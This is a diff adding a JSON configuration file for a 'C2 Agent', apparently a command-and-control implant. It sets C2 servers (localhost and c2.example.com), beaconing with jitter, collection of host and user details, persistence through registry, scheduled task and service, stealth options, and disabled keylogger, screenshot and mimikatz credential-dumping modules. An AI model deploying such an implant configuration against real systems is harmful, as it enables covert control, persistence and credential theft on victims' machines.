@@ -1,0 +1,80 @@
+{
+    "agent": {
+        "name": "C2 Agent",
+        "version": "3.0.0",
+        "debug": false
+    },
+    
+    "c2_server": {
+        "primary": {
+            "protocol": "http",
+            "host": "127.0.0.1",
+            "port": 8080
+        },
+        "backup": [
+            {
+                "protocol": "tcp",
+                "host": "127.0.0.1",
+                "port": 4444
+            },
+            {
+                "protocol": "dns",
+                "domain": "c2.example.com"
+            }
+        ],
+        "fallback_delay": 60
+    },
+    
+    "beacon": {
+        "interval": 10,
+        "jitter_percent": 0.3,
+        "max_retries": 5,
+        "retry_delay": 30
+    },
+    
+    "system_info": {
+        "send_hostname": true,
+        "send_username": true,
+        "send_os": true,
+        "send_ip": true,
+        "send_pid": true,
+        "send_admin": true
+    },
+    
+    "persistence": {
+        "enabled": true,
+        "methods": ["registry", "scheduled_task", "service"],
+        "interval": 3600
+    },
+    
+    "encryption": {
+        "enabled": true,
+        "algorithm": "aes",
+        "key_rotation": 86400
+    },
+    
+    "stealth": {
+        "use_dga": false,
+        "use_jitter": true,
+        "use_padding": true,
+        "mimic_traffic": true,
+        "user_agent_rotation": 3600
+    },
+    
+    "modules": {
+        "keylogger": {
+            "enabled": false,
+            "log_file": "~/.keylog.txt",
+            "max_size": 1048576
+        },
+        "screenshot": {
+            "enabled": false,
+            "quality": 80,
+            "interval": 300
+        },
+        "mimikatz": {
+            "enabled": false,
+            "commands": ["sekurlsa::logonpasswords"]
+        }
+    }
+}
